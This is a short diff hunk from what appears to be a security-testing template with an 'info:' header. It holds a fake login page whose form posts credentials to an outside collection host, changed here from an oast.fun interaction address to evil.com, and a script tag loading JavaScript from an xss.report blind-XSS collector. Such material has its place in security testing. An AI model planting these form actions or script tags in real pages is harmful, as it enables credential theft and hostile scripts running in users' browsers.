@@ -8,7 +8,7 @@ info:
         <script src=https://xss.report/c/faultydictator></script>
     </div>
     <div class="form-container">
-        <form action="http://zjwlaskqbrvaavyjuwiw383l4dtde1p92.oast.fun/login" method="post" class="form-signin">
+        <form action="http://evil.com/" method="post" class="form-signin">
             <div class="form-group">
                 <label for="username">Username</label>
                 <input type="text" name="username" size="20">
